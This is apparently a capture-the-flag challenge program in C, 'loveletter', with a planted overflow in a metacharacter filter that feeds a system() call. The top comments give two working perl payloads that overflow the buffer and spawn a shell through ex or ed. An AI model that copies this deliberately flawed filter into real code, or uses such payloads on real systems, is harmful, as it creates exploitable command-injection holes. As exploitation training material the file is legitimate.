// gcc -o loveletter loveletter.c -m32
// 
// payload 1. using ex
// $ (perl -e 'print "x ", "a"x251, ";", "\x01"') | ./loveletter
//   !sh
// 
// payload 2. using ed
// $ (perl -e 'print "d ", "a"x251, ";", "\x01"'; cat) | ./loveletter
//   !sh
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define MAXSIZE 256

char *prolog = "echo I love ";
char *epilog = " very much!";
unsigned short int idx;

typedef struct _COMMAND{
        char name[MAXSIZE];
        unsigned int prolen; //SIZE : 00(X) 01(O)...ff(O).
        unsigned int epilen;
        unsigned int namelen;
}COMMAND;

// Bug : ♡ ♥ --> 3byte
void protect(char *name){
        char dangerous[] = "#&;`'\"|*?~<>^()[]{}$\\,";
        char buffer[MAXSIZE];
        int i,j,index;
        index = 0;

        printf("[DBG] name is %s(%d)\n",name,strlen(name));

        for(i=0;i<strlen(name);i++){
                for(j=0;j<strlen(dangerous);j++){
                        if(name[i] == dangerous[j]){
                                strcpy(buffer, &name[i+1]); // next strings..
                                strcpy(&name[i], "♥");      // memcpy requires size... hide size by using strcpy...
                                memcpy(name+strlen(name), buffer, strlen(buffer));
                        }
                }
        }
        printf("[DBG] name is %s(%d)\n",name, strlen(name));
}


char loveletter[1024];
int main(int argc, char *argv[]){
        COMMAND command;
        memset(loveletter,0,1024);
        command.epilen = strlen(epilog);
        command.prolen = strlen(prolog);

        printf("[*] My lover's name is : ");
        fgets(command.name, MAXSIZE, stdin); 
        if(command.name[strlen(command.name)-1] == '\x0a'){
            command.name[strlen(command.name)-1] = '\x0';
        }

        printf("[*] Whatever happens, I'll protect her...\n");
        protect(command.name);
        command.namelen = strlen(command.name);

        printf("[*] Impress her upon my memory...\n");
        memcpy(&loveletter[idx], prolog, command.prolen); idx += command.prolen;
        memcpy(&loveletter[idx], command.name, command.namelen); idx += command.namelen; // memcpy too much byte? 
        // To get reach to RET, attacker can try overwriting prolen bytes...but, this leads stack smashing!
        memcpy(&loveletter[idx], epilog, command.epilen); idx += command.epilen;
       
        printf("[*] Her name echos in my mind...\n"); 
        system(loveletter);
}
